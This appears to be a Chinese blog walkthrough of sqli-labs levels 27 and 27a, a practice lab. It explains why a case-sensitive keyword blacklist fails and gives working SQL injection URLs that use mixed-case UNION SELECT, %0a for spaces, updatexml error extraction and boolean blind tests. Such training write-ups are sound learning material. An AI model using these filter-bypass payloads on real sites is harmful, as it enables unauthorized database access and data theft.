#  大小写即漏洞：sqli-labs 第 27 / 27a 关通关全解析  
原创 武文学网安
                        武文学网安  武文学网安   2026-01-20 18:12  
  
大家好，我是武文。  
  
在前面的 **26 / 26a 关**  
 中，我们已经意识到两个重要事实：  
- **SQL 注入并不依赖空格**  
  
- **黑名单过滤越复杂，系统往往越脆弱**  
  
而当我进入 **第 27 / 27a 关**  
 时，会发现作者把“过滤”的思路又往前推了一步。  
  
这一关，不再主要和空格较劲，而是开始在关键字本身上做文章  
## 一、第 27 / 27a 关整体说明  
<table><thead><tr><th data-colwidth="87"><section><span leaf=""><span textstyle="" style="font-size: 16px;">关卡</span></span></section></th><th><section><span leaf=""><span textstyle="" style="font-size: 16px;">页面回显</span></span></section></th><th data-colwidth="192"><section><span leaf=""><span textstyle="" style="font-size: 16px;">注入方式</span></span></section></th><th><section><span leaf=""><span textstyle="" style="font-size: 16px;">核心考点</span></span></section></th></tr></thead><tbody><tr><td data-colwidth="87"><section><span leaf=""><span textstyle="" style="font-size: 16px;">27</span></span></section></td><td><section><span leaf=""><span textstyle="" style="font-size: 16px;">有报错 / 有回显</span></span></section></td><td data-colwidth="192"><section><span leaf=""><span textstyle="" style="font-size: 16px;">显错注入 + UNION</span></span></section></td><td><section><span leaf=""><span textstyle="" style="font-size: 16px;">大小写绕过</span></span></section></td></tr><tr><td data-colwidth="87"><section><span leaf=""><span textstyle="" style="font-size: 16px;">27a</span></span></section></td><td><section><span leaf=""><span textstyle="" style="font-size: 16px;">无报错 / 无回显</span></span></section></td><td data-colwidth="192"><section><span leaf=""><span textstyle="" style="font-size: 16px;">布尔盲注</span></span></section></td><td><section><span leaf=""><span textstyle="" style="font-size: 16px;">大小写 + 逻辑判断</span></span></section></td></tr></tbody></table>  
两关**过滤逻辑几乎一致**  
，差异主要体现在**页面回显方式**  
。  
## 二、源码分析：过滤逻辑才是核心  
  
我们直接看源码（节选，逻辑一致）：  
<table><tbody><tr><td data-colwidth="287"><section><span leaf=""><span textstyle="" style="font-size: 16px;">27关</span></span></section></td><td data-colwidth="287"><section><span leaf=""><span textstyle="" style="font-size: 16px;">27a关</span></span></section></td></tr><tr><td data-colwidth="287"><section><span leaf=""><img data-src="https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3EWNX7fl2MX8Vy5wmWP9xsl5ibkDyx6I31qWYoWRVLupaX5GcTCmnUyA/640?wx_fmt=png&amp;from=appmsg" class="rich_pages wxw-img" data-ratio="0.6716981132075471" data-s="300,640" data-type="png" data-w="530" type="inline" data-imgfileid="100000838" data-aistatus="1"/></span></section></td><td data-colwidth="287"><section><span leaf=""><img data-src="https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3V1y4CcsfkUpeEVfBNJQ7ARgpoOxBibJ5PIiayJTWqJWIuUvjzTh7333A/640?wx_fmt=png&amp;from=appmsg" class="rich_pages wxw-img" data-ratio="0.5338709677419354" data-s="300,640" data-type="png" data-w="620" type="inline" data-imgfileid="100000839" data-aistatus="1"/></span></section></td></tr></tbody></table>  
$id= preg_replace()这个函数对大小写是敏感的。而MySQL 关键字解析大小写不敏感。过滤的是“字符串”，而不是 SQL 语义这正是第 27 系列的突破口。  
  
三、第 27 关通关（ UNION+显错实战）  
### 3.1 注入点确认  
```
?id=1        正常
?id=1'       报错
?id=1'%26%26'1'='1   正常
说明：
```  
- 单引号闭合  
  
- 存在 SQL 注入  
  
3.2 判断查询列数  
  
在前面查看源码的时候我们发现，只过滤了关键词：注释符、  
[ +]空格，  
select、  
union、  
select、  
UNION、  
SELECT、  
Union、  
Select。并没有过滤or和and，所以这里我们可以继续使用or和and不用再次绕过。空格我们可以用%0a代替。  
```
?id=1' order%0aby%0a1%26%26'1'='1
 ?id=1' order%0aby%0a2%26%26'1'='1
 ?id=1' order%0aby%0a3%26%26'1'='1
 ?id=1' order%0aby%0a4%26%26'1'='1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3sdXdLm2P88goYUlIXqu6pCVK7STnwQbicrls5wAJYOspQEy9bDLqvwQ/640?wx_fmt=gif&from=appmsg "")  
  
这里出现问题了，发现一致测试到order by5都是正常显示，应该是在测试第4列时就报错，但这里一致显示正常，很不解，查阅部分资料显示，当索引超出 SELECT 列数时，MySQL 在某些版本 / 场景下不会直接抛出错误，而是被优化器忽略。但我们可以直接通过 UNION 构造回显来反推出列数。  
  
3.3 大小写绕过 UNION  
  
按照以往经验直接尝试用union回显：  
```
?id=1'union%0aselect%0a1,2,3%26%26%271%27=%271
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3SPxNaBGaWdORiaTvibUEGRV99pwsmtmVpzKC7gkP1qoUKchTagGIicxag/640?wx_fmt=png&from=appmsg "")  
  
发现页面报错，下面的hint提示union已经被过滤。因前端对大小写敏感，而Mysql数据库对大小写不敏感，所以我们可以这样写：  
```
?id=1.1'uniOn%0aseLect%0a1,2,3%26%26%271%27=%271
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3ibpGLmcL5JFKY2s2Rmq5nrv5G1cVjU6cQViaqIx9NEpJQLhFRxCiaPJJg/640?wx_fmt=gif&from=appmsg "")  
  
3.4 获取数据库名  
```
?id=1.1'uniOn%0aseLect%0a1,database(),3%26%26%271%27=%271
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3icaD6fHcSVPch5v00gR8TBbm51JsKdicOfo80Jm79gWVw08BKicEMOeJQ/640?wx_fmt=gif&from=appmsg "")  
  
这里回显位为2。可以用第2个回显位获取我们想要的数据。  
  
3.5 获取表名  
```
id=1.1%27uniOn%0aseLect%0a1,group_concat(table_name),3%0aFrOm%0aInFoRmAtIoN_sChEmA.tables%0aWhErE%0atable_schema=database()%26%26%271%27=%271
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3uq2JfpGHf4skxwBwibodxXEm3OfpdRGwlF4ZZVibFTDk2rtvnYnMJbTQ/640?wx_fmt=gif&from=appmsg "")  
  
可以正常利用union回显。  
  
3.6 尝试XPATH显错：  
```
?id=1'and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)%26%26'1'='1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3bIJNibZDEXmO2VAyFzbZY2dCYXKua5oYXUVJvv0AKqSRic6RVia4CeOTw/640?wx_fmt=gif&from=appmsg "")  
  
同样我们可以利用XPATH显错进行注入。剩余数据获取可根据[SQL注入实战——显错注入。Sqli-labs第6关](https://mp.weixin.qq.com/s?__biz=MzY0MDE4OTg4Mw==&mid=2247484120&idx=1&sn=1c995a983b7681abfcde855246e1de5e&scene=21#wechat_redirect)  
  
调整payload即可。  
  
四、第 27a 关通关（布尔盲注）  
### 4.1 页面特征分析  
  
27a 的明显特征是：  
- ❌ 没有 SQL 报错  
  
- ❌ 没有 UNION 回显  
  
- ✅ 只有「正常 / 异常」两种状态  
  
<table><tbody><tr><td data-colwidth="287"><section><span leaf=""><img data-src="https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3vAnnwEOSiaNcdVRwupSYyRmXE8ibNicxqqFSk1QhTrmx8VRExTCuKMO4Q/640?wx_fmt=png&amp;from=appmsg" class="rich_pages wxw-img" data-ratio="0.6018518518518519" data-s="300,640" data-type="png" data-w="1080" type="inline" data-imgfileid="100000850" data-aistatus="1"/></span></section></td><td data-colwidth="287"><section><span leaf=""><img data-src="https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3U5JcrB5wiaaI9Mn1n76ffLywPX0A9aBn7JVBX0icl84uPXycjs5LyOgQ/640?wx_fmt=png&amp;from=appmsg" class="rich_pages wxw-img" data-ratio="0.5503062117235346" data-s="300,640" data-type="png" data-w="1143" type="inline" data-imgfileid="100000849" data-aistatus="1"/></span></section></td></tr></tbody></table>  
4.2 判断闭合方式  
```
?id=1'                正常
?id=1"                 错误
?id=1"and"1"="1      正常
```  
  
（注：实验的时候带入了26关思维，and写成了%26%26，不影响结果。）  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3OdicC5AZlrT5bibEgQtevM8sraDJPib6hLkqLsTgs1tum5Y2DibH25bBTA/640?wx_fmt=gif&from=appmsg "")  
  
可以得出结论：闭合方式为双引号。  
  
4.3 判断数据库名长度  
```
?id=1"and%0alength(database())>5%0aand%0a"1"="1
?id=1"and%0alength(database())>8%0aand%0a"1"="1
?id=1"and%0alength(database())=8%0aand%0a"1"="1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg35icRmx5n896O5dowMc6er5sfwSA3icQ7keUOIbYBYfw5yukJGxRrtSUw/640?wx_fmt=gif&from=appmsg "")  
  
接下来的判断可以按照[SQL注入实战——布尔盲注，Sqli-labs第8关为例从原理到脚本实现](https://mp.weixin.qq.com/s?__biz=MzY0MDE4OTg4Mw==&mid=2247484046&idx=1&sn=01d15cad3d16137e2a1215811aa4c637&scene=21#wechat_redirect)  
  
依次猜测。  
## 五、为什么已经可以手工注入，但 sqlmap 却无法自动化？  
  
近几关没写sqlmap测试的关卡，我在尝试用sqlmap自动化注入测试，但均已失败告终。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVE1DFTqftsujSqsvQaicNpg3DEM7WLLYuI9b1AZziaFpzYJebN1O5sXicvibmnQOwIZ8hx0kT0nwpSWXg/640?wx_fmt=gif&from=appmsg "")  
  
即使在手工已经明确确认：  
- 存在注入  
  
- 闭合方式明确  
  
- UNION / 布  
尔盲注都  
可以利用  
  
但使用 sqlmap 时：  
```
all tested parameters do not appear to be injectable
```  
  
根本原因：最近几个关卡似乎是“反自动化设计”。  
  
sqlmap 能自动化注入，**必须满足一个前提**  
：  
  
同一类 payload  
  
→ 进入数据库前 SQL 结构保持一致  
  
→ 仅逻辑条件变化  
  
→ 页面稳定响应  
#### ① payload 在进入数据库前已被破坏  
- 关键字被替换 / 删除  
  
- 大小写被强制转换  
  
- 空格、注释符不可用  
  
导致：sqlmap 每一次测试，实际执行的 SQL 结构都不同  
#### ② sqlmap 无法建立“真假对照模型”  
- 对人来说：我只关心「页面正常 / 异常」  
  
- 对 sqlmap 来说：它需要**可重复、可预测的 SQL 行为**  
  
结语  
  
这两关最有价值的一点在于：  
注入是否成功，取决于 SQL 是否真正被执行，而不是过滤规则看起来有多复杂  
。  
  
同时，这也是 sqlmap 在近几关频繁失效的根本原因——payload 在进入数据库前已被破坏，SQL 结构无法保持稳定，自动化工具无法建立可靠的判断模型，而人工却可以通过语义逐步推断。  
  
  
